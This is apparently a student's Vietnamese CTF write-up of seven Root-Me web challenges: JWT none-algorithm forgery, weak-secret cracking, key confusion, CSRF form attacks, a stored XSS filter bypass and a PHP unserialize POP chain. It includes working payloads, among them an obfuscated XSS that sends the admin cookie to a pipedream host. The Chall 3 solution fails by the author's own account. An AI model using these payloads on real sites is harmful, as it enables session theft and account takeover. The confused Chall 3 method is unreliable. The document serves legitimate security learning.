# Trần Mạnh Huy - Task2
<hr>

* [Chall 1: JSON Web Token (JWT) - Introduction](#chall-1-json-web-token-jwt---introduction)
* [Chall 2: JSON Web Token (JWT) - Weak secret](#chall-2-json-web-token-jwt---weak-secret)
* [Chall 3: JSON Web Token (JWT) - Public key](#chall-3-json-web-token-jwt---public-key) 
* [Chall 4: CSRF - 0 protection](#chall-4-csrf---0-protection)
* [Chall 5: CSRF - token bypass](#chall-5-csrf---token-bypass)
* [Chall 6: XSS - Stored - filter bypass](#chall-6-xss---stored---filter-bypass)
* [Chall 7: PHP - Unserialize Pop Chain](#chall-7-php---unserialize-pop-chain)

<hr>

## Chall 1: JSON Web Token (JWT) - Introduction
```
To validate the challenge, connect as admin.
```
Ta có login form như sau 

![image](https://user-images.githubusercontent.com/104350480/219703907-2e0197cf-93da-4230-a230-164f0473c52c.png)

Để ý có nhấn vào guest thử rồi check burp:

![image](https://user-images.githubusercontent.com/104350480/219705924-bb74b020-b6d7-48b5-a735-c662ef36634e.png)

Sửa thử username = admin thì server trả về lỗi: 

![image](https://user-images.githubusercontent.com/104350480/219708136-04c02ff0-8a0f-4ce9-891f-fee65f60067a.png)



Thế thì ta chỉnh alg = none vì để none thì server sẽ kh xác thực signature nữa, ta xóa phần signature cũng được và lỗi cũng biến mất, ta được kết quả.

![image](https://user-images.githubusercontent.com/104350480/219706460-833ef24c-d343-48b9-9eff-aa7d2a16d3ae.png)

> flag: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7

```
import base64
import json

header = {'typ':'JWT', 'alg':'none'}
payload = {'username':'admin'}
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode('utf-8').rstrip('=')
data = header_encoded +'.'+payload_encoded+'.'
print(data)
```

## Chall 2: JSON Web Token (JWT) - Weak secret

```
"Let's play a small game, I bet you cannot access to my super secret admin section. Make a GET request to /token and use the token you'll get to try to access /admin with a POST request."

```

![image](https://user-images.githubusercontent.com/104350480/219711939-05cb4769-bdef-4024-aea3-2e92e5ffb132.png)

Mở đường dẫn /token ta có token:

> Here is your token	"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"

![image](https://user-images.githubusercontent.com/104350480/219831488-82906321-0618-429f-a177-6ed253af0c4f.png)


Chuyển sang phương thức POST /admin, ta có: 

![image](https://user-images.githubusercontent.com/104350480/219831018-a2a1142c-255f-42ca-a9b4-9a897db12daf.png)

Thêm Authorization vào xem được gì nào: 

![image](https://user-images.githubusercontent.com/104350480/219831273-213e8862-495d-4558-b382-0bd9f36e0e7a.png)

Bài này dùng alg: HS512, thì như tên bài thì có vẻ secret key khá yếu, dùng tool để bruteforce xem sao: Ở đây ta dùng jwt_tool với list đơn giản
từ rockyou.txt

> payload: python3 jwt_tool.py --token --C -d /usr/share/wordlists/rockyou.txt 

![image](https://user-images.githubusercontent.com/104350480/219830868-0655a46b-6375-4fa5-bab8-da0cac9e3afd.png)

Oke vậy là ta có được secretkey là lol, giờ ném lên jwt.io chỉnh lại payload thành admin và thêm secretkey lol là xong: 

![image](https://user-images.githubusercontent.com/104350480/219832730-a58fad6e-e2cb-48c3-a422-c3b4d957b817.png)

> Flag: PleaseUseAStrongSecretNextTime
 
Hoặc có thể dùng cách khác để bruteforce khá đơn giản là dùng hashcat

>payload: hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt --force

> https://hashcat.net/wiki/doku.php?id=example_hashes

![image](https://user-images.githubusercontent.com/104350480/219835386-3adb6412-afff-454e-80fa-f1b89997c6ba.png)

Ta cũng có được secretkey tương ứng là lol

![image](https://user-images.githubusercontent.com/104350480/219836351-03ba3270-2447-4a15-a901-d7d27cab47c5.png)

## Chall 3: JSON Web Token (JWT) - Public key

```
You find an API with 3 endpoints:

/key (accessible with GET)
/auth (accessible with POST)
/admin (accessible with POST)
There is sure to be important data in the admin section, access it!

```
Mở vào trang thì cũng kh có gì, nhưng như bài đã cung cấp cho ta 3 endpoint rồi:

![image](https://user-images.githubusercontent.com/104350480/220160437-189b3652-27a0-4163-a95c-0e31fccfad79.png)

Ném lên burpsuite và truy cập vào **GET /web-serveur/ch60/key** ta được 1 public key trả về đúng như tên bài: 

```
"-----BEGIN PUBLIC KEY-----", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4iMUdm9olWjWrZLP5g9R", "TqFux6r1Wx0ovriPNnW5QdTYFb/FyCDOoUV4S0GGe+Ef/mi9gIQBlABIoGL34+6w", "SZyHQv+8ESxRBlniqhJQ8fMJzVV0kWDN4MtnWmFeTOhuHQ8/rBFAtJEk5tl0PZia", "KcWFghtPufxhzUqLgggO7bztvngRWztgExgcwo77NyeYQ2+EUQMgHgAKcydVokbU", "64VnfDtONsfc6o1F+EIKVhlEkp5g46oKAbiTHFlwbrasdsKVMeN9qv9+sBNbmJI/", "Au6YMj9TifkVd/OSOlW9DkCL/HIGSoaBiCC5eK+8Am4/QAo+NYEoYJ9D9TNs2f2O", "fQIDAQAB", "-----END PUBLIC KEY-----"

```

![image](https://user-images.githubusercontent.com/104350480/220160747-369e6985-bd0f-4570-bea3-1c8760b1c3b9.png)

Thử sang đường dẫn là **POST /web-serveur/ch60/admin** ta được:

![image](https://user-images.githubusercontent.com/104350480/220161853-29c693bf-e87d-445d-b25a-ceaf0ed4611e.png)

Sửa như message trả về, ta thêm 'Authorization: YOURTOKEN' vào thì được message khác trả về:

![image](https://user-images.githubusercontent.com/104350480/220169775-4df38871-a549-4ced-8a2f-d1cfccdb76d0.png)

Cần xác thực authentication nên tiếp với đường dẫn **POST /web-serveur/ch60/auth** ta được:

![image](https://user-images.githubusercontent.com/104350480/220161687-6a092d07-8ccf-4d5b-a347-b1b35dd1fe70.png)

Thêm username=admin vào xem sao:

![image](https://user-images.githubusercontent.com/104350480/220174432-7232c6a1-b9cd-4292-ade7-9eb26a435c80.png)

Lỗi là chắc rồi, ta lại thay bằng guest để lấy token thôi: 

```
{"result": "Hello guest", "Here is your token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.ijki-3H5jA6wsSWu6tKXy7HwOQcbvxkc9c1vHWgqOF8gP7dkCUg2nE7QJ2FYeuGj2-VdRPOUVdQzKfOvrsaTVI3uDmUNygrvVm8Yhuw6o9nlqtm5_MNe53dQ5Pmo7uBg-JyfMhEUvHWdW2uXLW-rxSDRCq8xcdG3RC8smzUMLs_-VmboAaW9rV-IMw5JERSZmlPnEGAQ0oMowEC8C3G1LcE5_0vZ9EtNq8yWkzr9I2CWfLwkZIWh1rj0XOI3I_iFrFsr2-LP0xK-NdaArQ86o59XjMU1KgqNCSAGQ0JmDQtvMymYWt6PkDjlzQ2x3YILJpA5gpAS8ZTOJdVnF_rZ3w"}

```
Sau khi có được token lên jwt.io để phân tích thử, ta thu được alg được dùng là RS256 và public key được dùng để verify và private key dùng để ký:

![image](https://user-images.githubusercontent.com/104350480/220175012-285f05bc-63ee-4a46-8674-813d81c6ccf5.png)

Đến đây vì là kiến thức cũng mới nên mình phải dừng đọc tài liệu chút:

> Reference: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf?_gl=1*c017c9*_ga*NzM2OTE5OTkuMTY2OTA4MzExMA..*_ga_SRYSKX09J7*MTY3NjkwOTE4Ni4xMDQuMS4xNjc2OTA5NjE1LjAuMC4w

Ở bài này đọc related source mà rootme cung cấp thì bài này có liên quan đến việc thay đổi thuật toán mã hóa, thì cụ thể ở đây thì với các thuật toán như
HS256 hay HS512 thì dùng secret key để ký và verify() các message trả về, còn thuật toán RS256 được dùng trong bài này là dùng private key để ký message 
còn dùng public key để veryfy() các message này. Thì như trong source cung cấp thì ta có thể hiểu thế này, nếu mà ta thay đổi được thuật toán từ RS256
sang HS256 được thì signature bây giờ được verify hay xác minh bằng cách sử dụng thuật toán HS256 với chữ kí bây giờ là public key thay cho secret key, mà
public key là cái mà ta đã biết rồi nên nếu đổi được thuật toán thì coi như ta sẽ có được secret key và lúc này coi như sẽ giải quyết được chall.

Để khai thác tiếp thì ta sửa đổi đoạn jwt trên chút:

![image](https://user-images.githubusercontent.com/104350480/220254516-875b7a8e-85c7-4f57-9d0e-b1d64ba6e4d8.png)

Lấy phần header và payload để kết hợp với publickey: 

> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0

Ta chuyển public key về dạng giá trị hex ASCII là người dùng có thể kiểm soát Byte và có thể xử lý an toàn khi nhập lệnh.

![image](https://user-images.githubusercontent.com/104350480/220250615-5b245a42-4701-41b2-a029-daec8ad553d4.png)

> 8e5c1adf326f172ce185e38ab5a05dc3306cf52e9112fc97f22d5f3b3a6c8854

> cmd: echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:<public_key_ascii>

![image](https://user-images.githubusercontent.com/104350480/220254489-4c31e94d-d4d4-43e8-b87c-83bd99b8a5e4.png)


Câu lệnh trên sẽ thực hiện 2 nhiệm vụ chính là tính giá trị băm SHA-256 của một chuỗi JSON dưới dạng hexa và sau đó sử dụng giá trị băm SHA-256 vừa tính để tạo chữ ký HMAC-SHA256, trong đó:
+  openssl dgst: Sử dụng OpenSSL để tính toán giá trị băm và chữ ký HMAC.
+  -sha256: Chỉ định thuật toán băm là SHA-256.
+  -mac HMAC: Chỉ định sử dụng chữ ký HMAC.
+  -macopt hexkey: Chỉ định khóa cho chữ ký HMAC được cung cấp dưới dạng chuỗi hexa mà ở đây chính là public key

Dùng cyberchef ta thu được: 

![image](https://user-images.githubusercontent.com/104350480/220254216-951f2292-460f-4212-962c-84e39872d2cc.png)

secret key: 1W3RMVZGwzYeNB+dB2QTJ4CbJUn9JsQgD6tESW+wrU8

Nhưng khi mình lắp lại thử như này truyền vào biến authorization thì truyền kh thu được kết quả:

> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.1W3RMVZGwzYeNB+dB2QTJ4CbJUn9JsQgD6tESW+wrU8

Ném lên jwt xem thử thì nó báo là encoded có vẻ kh chuẩn, nên thử sử dụng script viết thì thu được 1 giá trị khác:

```
import hashlib
import base64

message = 'd56dd1315646c3361e341f9d07641327809b2549fd26c4200fab44496fb0ad4f'

# Tính giá trị băm SHA-256 của đầu vào
hash_object = hashlib.sha256(message.encode('utf-8'))
hash_value = hash_object.hexdigest()

# Chuyển đổi đoạn mã băm từ hex sang dạng byte
byte_value = bytes.fromhex(hash_value)

# Chuyển đổi byte sang base64url
base64_value = base64.b64encode(byte_value).decode('utf-8')
base64url_value = base64_value.replace('+', '-').replace('/', '_').rstrip('=')

# In kết quả
print(base64url_value)

```

> hge2UO5MKTrhBLtX8deOaDsCzxMUFcRDSpyB0LXKb9I

Nhưng khi lắp vào thì server vẫn kh trả về kết quả, nên mình cũng kh hiểu lm.


## Chall 4: CSRF - 0 protection

Mở vào chall là có:

![image](https://user-images.githubusercontent.com/104350480/219910186-addd360d-2a09-4472-9427-149f8b36bcea.png)

Vì là dạng csrf nên chưa khai thác được gì, ta register rồi đăng nhập vào trang thì được

![image](https://user-images.githubusercontent.com/104350480/219910295-afb165e6-3a6a-42d3-a3c1-2446afbfee15.png)

Mục tiêu bây giờ là phải xem được thông tin private, hay phải bật được status on của mình chỗ profile:

![image](https://user-images.githubusercontent.com/104350480/219911520-c7c9b76e-6368-4759-acd4-0e105050cada.png)

Ta có thể để ý status đang bị disabled, ta có thể sửa lại thành value="on", nhưng tất nhiên là không thu được gì, server trả về "You're not admin"

![image](https://user-images.githubusercontent.com/104350480/219912788-791a0026-95e1-4087-aca3-860e82f9efb1.png)

Bây giờ ta cần gửi 1 form tương tự để lừa admin kick vào link ta gửi. Lấy luôn source code từ trang và thêm link trang vào phần action:

```
<form id="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<div>
<label>Username:</label>
<input id="username" type="text" name="username" value="huy123456">
</div>
<br>		
<div>
<label>Status:</label>
<input id="status" type="checkbox" name="status" value="on" >
</div>
<br>
<input id="token" type="hidden" name="token" value="dd29a211ad5ad8b6e426dde5150648dd" />
<button type="submit">Submit</button>
</form>
   
   ```
 Sửa lại form 1 chút, thêm script để tự động gửi submit: 
 
 ```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
    <form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="username" value="huy123456" />
    <input type="hidden" name="status" value="on" />
    </form>
<script> document.getElementById("csrf").submit()</script> 
</body>
</html>

```

Đợi 1 lúc ta được flag trả về:

> Csrf_Fr33style-L3v3l1!

## Chall 5: CSRF - token bypass

```
Activate your account to access intranet.

```
Dạng này thực sự thì mình chưa hiểu lm nên là có tham khảo writeup để học thêm kiến thức.
Thì cũng như bài trên nhưng bài này đã có lớp phòng thủ, ta phải submit 1 dynamic token vào form của ta nữa.
Vẫn bắt đầu với form: 

```
<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
                <input id="username" type="text" name="username" value="huy123">
                <input id="status" type="checkbox" name="status" checked >
                <input id="token" type="hidden" name="token" value="" />
                <button type="submit">Submit</button>
</form>

```
Đoạn scipt ta bổ sung thêm:

```
<script>

                xhttp = new XMLHttpRequest();
                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
                xhttp.send();

             
                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));

                document.getElementById('token').setAttribute('value', token_admin)

                document.csrf_form.submit();
</script>

```

Trong đó thì ở đây khởi tạo 1 đối tượng XMLHttpRequest() để mở 'http://challenge01.root-me.org/web-client/ch23/?action=profile' với phương thức GET
- Ở đây XMLHttRequest() cho phép ta xử lí thao tác gửi và nhận từ một máy chủ web bất đồng bộ mà kh cần phải tải lại trang web hay toàn bộ trang.
- Ngoài ra để ý tham số thứ 3 là 'false' ở đây có tác dụng bật chế độ đồng bộ, tức sẽ chờ xử lí xong đã rồi mới tiếp tục thực hiện tiếp.
Sau đó gửi yêu cầu cho máy chủ. 
- Bước tiếp theo dùng match để tìm kiếm một chuỗi có 32 ký tự ứng từ a-z0-9, thực chất là sẽ phải thử lần lượt cho đến khi được thì thôi, nếu có thì sẽ được gán vào biến admin.
- Sau khi có được token rồi thì ta nộp form như bài trước là ra được flag: 

![image](https://user-images.githubusercontent.com/104350480/220264495-97ddc300-76a1-4aa5-ac5b-bd09fad105e1.png)

> Flag: Byp4ss_CSRF_T0k3n-w1th-XSS

## Chall 6: XSS - Stored - filter bypass

```
There are protections in place
Statement
Steal the administrator’s session cookie.

```
> Reference: https://hackmd.io/@devme4f/SJY9JKpFc#XSS---Stored---filter-bypass

##### Bài này mình tấn công xss luôn vào message, nhưng thử thì bị filter khá nhiều, ' ', " ", alert( , document. , <script>,..... Sau 1 hồi dùng burpsuite 
intruder với từng tag và attribute trong **https://portswigger.net/web-security/cross-site-scripting/cheat-sheet** thì mình thu được thẻ tag svg với attribute 
là **animatetransform** và **onbegin** dùng để kích hoạt 1 hoạt động cụ thể, vì alert( bị filter nên ở đây ta thử thay bằng print() xem sao:

> payload: <svg><animatetransform onbegin=print()>

![image](https://user-images.githubusercontent.com/104350480/220233708-c838dfb4-b486-4952-b69f-6441a2d91b67.png)

Vậy là thực thi thành công, tiếp theo đến phần chuyển trang với document.cookie, vì document.cookie đã bị chuyển trang nên ta có thể tận dụng 1 cách khác
để lấy cookie ở đây là document['cookie'] cũng tương tự như trên:
Ý tưởng payload sẽ là: dùng pipedream để tạo đường dẫn chuyển trang xong dùng concat để nối document['cookie'] vào như này: 
> location='https://eo7xxasp6lhfvaj.m.pipedream.nethttps://eo7xxasp6lhfvaj.m.pipedream.net/?c='.concat(document['cookie'])
 
Nhưng như đã nói ở trên ' ' và " " đề bị lọc nên kh thể thực hiện trực tiếp như trên được, nhưng để ý nó đều ở dạng string thì ta có thể thay thế nó 
bằng cách tận dụng String.fromCharCode để khai thác. Payload như sau:
> <svg><animatetransform onbegin=(location=(String.fromCharCode(104,116,116,112,115,58,47,47,101,111,55,120,120,97,115,112,54,108,104,102,118,97,106,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,99,61).concat(document[String.fromCharCode(99,111,111,107,105,101)])))>

Thực hiện chuyển trang thành công:

![image](https://user-images.githubusercontent.com/104350480/220234419-b55beced-4d13-479c-8eef-e3e3d831f87a.png)

Và cookie được trả về: 

![image](https://user-images.githubusercontent.com/104350480/220234492-e1e8b068-1017-4add-abff-eaf54a90185f.png)

## Chall 7: PHP - Unserialize Pop Chain
 
```
Statement
Can you avoid the security your friend put in place to access the flag?
 
 ```
 Bài này cho ta source code:
 
 ```
 <?php

$getflag = false;

class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }

    function __toString() {
        return $this->receive;
    }

    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG."<br>";
            }
        }
    }
}

class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }

    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}

?>
 
 ```
 
 Mở vào giao diện bài là 1 khung gửi tin nhắn và link source với tiêu đề bạn có thể bypass không? :))
 
 ![image](https://user-images.githubusercontent.com/104350480/220235297-03dd0e21-e826-4b2f-8bda-71fd27a523a3.png)

 Đọc source code thì đây là dạng php pop chain, tức là ta phải truyền tin nhắn dưới dạng serialized object trong php
 
 Link tham khảo về php object injection
 
 > Reference: https://www.youtube.com/watch?v=-VG9ujeYu9o&t=2016s
 
 Vấn đề là từ source code, làm thế nào để bypass được. Phân tích code 1 chút, nếu ta truyền vào giá trị serialize qua $data thông qua giao thức POST thì 
 nó sẽ được thực hiện unserialize, mà khi unserialize thì magic method wakeup() sẽ được gọi rồi nối chuỗi gadget thực hiện với toString, xong khởi tạo mội đối
 tượng mới với **new GetMessage($this->msg))->receive;** , và khi khởi tạo 1 đối tượng mới thì __construct sẽ được gọi, và kiểm tra xem giá trị truyền vào
 có phải là "HelloBooooooy" hay không, nếu có thì sẽ trả về 1 message mà sẽ gặp rất nhiều lần trong bài này :( là : **[FRIEND]: Ahahah you get fooled by my
 security my friend!<br>**, còn nếu không thì nó sẽ được gán vào $receive và đi qua hàm __toString() để chuyển về dạng chuỗi, nhưng vấn đề là khi kết thúc đối 
 tượng hàm __destruct() sẽ được gọi ra và vấn đề mới thực sự ở đây: 
 
 ![image](https://user-images.githubusercontent.com/104350480/220239781-5afab5fb-1414-485a-a93c-408644516993.png)
 
 $getflag ở đây được sử dụng ở đây dùng để lưu trạng thái của việc lấy cờ ban đầu là false. Trong hàm __toString() của lớp WakyWaky, biến $getflag sẽ được gán
 giá trị true, khi đối tượng GetMessage được huỷ bởi hàm __destruct(), giá trị của biến $getflag sẽ được kiểm tra. Nếu giá trị của $getflag là true ta có thể
 đọc được file flag.php.
 Vậy làm sao để bypass được nó? Mình thử đủ kiểu thì nó chỉ trả về hoặc là message đầu trong __construct, hoặc là message đầu trong dòng if của __destruct().
 Đến mãi sau thì mới hiểu là có thể tận dụng code của bài bằng cách gọi ra 1 đối tượng mới GetMessage trước và truyền giá trị bất kì vào: 
 > $a = new GetMessage('abcd1234');
 
 Lúc này receive sẽ lưu giá trị là 'abcd1234', nhưng ta sẽ gán luôn thuộc tính receive của đối tương $a là $a->receive = 'HelloBooooooy'; 
 Tiếp theo ta tạo một đối tượng **new WakyWaky()** mới và lưu trữ trong $test, thuộc tính $msg của $test sẽ được đặt trong đối tượng a:
 
``` 
 $test = new WakyWaky();
 $test->msg=$a;
 ```
 Vậy là bypass được rồi, còn vì sao hàm __construct lại không được gọi ra thì mình có tìm hiểu được là:
 
 ```
Khi ta deserialize chuỗi O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}} bằng hàm unserialize(), PHP sẽ khởi tạo đối tượng WakyWaky và đối tượng GetMessage theo thứ tự đã định nghĩa trong chuỗi truyền vào.

Khi khởi tạo đối tượng WakyWaky, nó sẽ gọi hàm __wakeup() nhưng không gọi hàm __construct(). Điều này xảy ra vì trong chuỗi serialized, ta không cung cấp đủ thông tin để PHP gọi hàm __construct() của đối tượng GetMessage. Do đó, khi khôi phục đối tượng từ chuỗi serialized, PHP sẽ không gọi hàm __construct() của GetMessage.
 
 ```
 
 ![image](https://user-images.githubusercontent.com/104350480/220241862-0d051c01-4f1c-428f-94ac-3391701ed03b.png)

 Ta chuyển về serialize($b) để lấy ra giá trị rồi gửi qua $data:
 
 > O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}

 Vậy là đã bypass được,ta được kết quả của flag: 

 ![image](https://user-images.githubusercontent.com/104350480/220237114-1c05e967-82b7-4389-9d7e-b7282ce95b9b.png)
 
 > Flag: uns3r14liz3_p0p_ch41n_r0cks
